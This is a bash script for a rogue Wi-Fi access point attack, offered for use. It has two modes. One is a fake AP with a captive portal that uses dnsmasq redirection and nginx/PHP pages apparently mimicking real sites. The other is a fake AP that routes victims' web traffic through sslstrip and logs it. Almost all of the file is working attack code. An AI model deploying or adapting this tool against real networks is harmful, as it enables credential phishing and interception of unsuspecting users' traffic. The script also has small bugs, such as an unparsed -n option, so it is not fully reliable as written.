#!/bin/bash
function usage(){
	echo "Usage: 
		-w -> Wireless Interface to bind
		-n -> Wireless Network name
		-t [option] -> Attack
			1 - FakeAp with captive portal
			2 - FakeAp with mitm"

}
function intercept(){
  . message.sh status "Starting Network Routine"
  network intercept
  . message.sh status "Iptables Rules going up"
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to 1000
  . message.sh status "Starting hostapd"
  hostapd
  . message.sh status "Starting sslstrip"
  sslstrip -l 1000 -w /tmp/sslstrip.log

}
function captive_portal(){
  . message.sh check "Starting Network Routine"
  network
  . message.sh check "Starting Fake AP Routine"
  hostapd
  . message.sh check "Starting Security Routine"
  security
  . message.sh check "Starting WebServer Routine"
  webserver
}
function hostapd(){
	. message.sh status "Setup HostAPD"
	if [ $(pidof hostapd) ];then
		. message.sh error "Looks like Hostapd is already running at pid $(pidof hostapd)"
	elif [ -f conf/hostapd.conf ];then
		. message.sh status "Starting hostapd"
		/usr/sbin/hostapd -Bdd conf/hostapd.conf
	else 
		. message.sh error "Hostapd isn't running and the config file is missing"
	fi
}

function network(){
	. message.sh status "Shutdown wlan0"
	ifconfig wlan0 down
	. message.sh status "Setup wlan1 at /etc/network/interfaces"
	if [ $(grep -i wlan0 /etc/network/interfaces | wc -l ) -eq 0 ];then
		cat conf/wlan0.conf >> /etc/network/interfaces
	else
		. message.sh error "Wlan1 already configured, but maybe wrong. Human, please check"
	fi
	. message.sh status "Bring up wlan0"
	ifconfig wlan0 up
	. message.sh status "Configuring Dnsmasq"
	if [ $1 == "intercept" ];then
  		. message.sh status "Setup dnsmasq to intercept attack"
		cp conf/dnsmasq.conf.intercept /etc/dnsmasq.conf
	else
		cp conf/dnsmasq.conf /etc/dnsmasq.conf
	fi
	/etc/init.d/dnsmasq start
	. message.sh status "Enabling routing"
	sysctl net.ipv4.ip_forward=1
}

function security(){
	. message.sh check "Security: Firewall rules to isolate trafic cross networks"
#	iptables -I FORWARD -i wlan0 -o wlan1 -j DROP
#	iptables -I FORWARD -i wlan1 -o wlan0 -j DROP
#	iptables -I FORWARD -i eth0 -o wlan0 -j DROP
#	iptables -I FORWARD -i wlan0 -o eth0 -j DROP
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 192.168.8.1
	iptables -t nat -A POSTROUTING ! -d  192.168.8.0/24 -j MASQUERADE
	. message.sh status "[*] Firewall Rules UP"
}

function webserver(){
	. message.sh check "Check Nginx"
	if [ -n $(pidof nginx) ];then
		. message.sh error "Looks like Nginx is running. Stopping NOW"
		systemctl stop nginx
	fi
	. message.sh status "Configuring Nginx Virtual Hosts"
	rm -f /etc/nginx/sites-enabled/*
	if [ ! -d /var/www/nginx ];then
		mkdir /var/www/nginx
	fi
	for i in $(ls  conf/vhosts/*/*.conf);do
		FILENAME=$(echo $i | cut -d '/' -f4 )
		NAMEDIR=$(echo $i | cut -d '/' -f4 | cut -d '.' -f1)
		. message.sh status "	Setup $FILENAME with domain $(grep server_name $i | cut -d ' ' -f 2) and DNS -> $(grep -i $NAMEDIR /etc/dnsmasq.conf | cut -d '/' -f 3 )"
		ln -s $(pwd)/$i /etc/nginx/sites-enabled/$FILENAME
		if [ ! -d /var/www/nginx/$NAMEDIR ];then
			mkdir /var/www/nginx/$NAMEDIR
			cp conf/vhosts/$NAMEDIR/index.* conf/vhosts/$NAMEDIR/*.php /var/www/nginx/$NAMEDIR/
		else
			. message.sh error "Vhosts Directory already exists"
		fi
	done
	chown -R www-data.www-data /var/www/nginx
	. message.sh status "starting php-fpm"
	/etc/init.d/php7.2-fpm start
	. message.sh status "Starting Nginx"
	systemctl start nginx
}

while getopts w:st:h opt
do	
	case "$opt" in
	w)	WFACE="$OPTARG"
		;;
	n)	NETNAME="$OPTARG"
		;;
	t)	TYPE="$OPTARG"
		;;
	h)	usage
		exit 1
		;;
	*)	usage
		exit 1
		;;
	esac
done

# Check for attack vector and launch!
case "$TYPE" in
	1)
		captive_portal
		;;
	2)
		intercept
		;;
	
	*) 	. message.sh error "Invalid attack vector!"
		usage
		exit 1
		;;

esac 
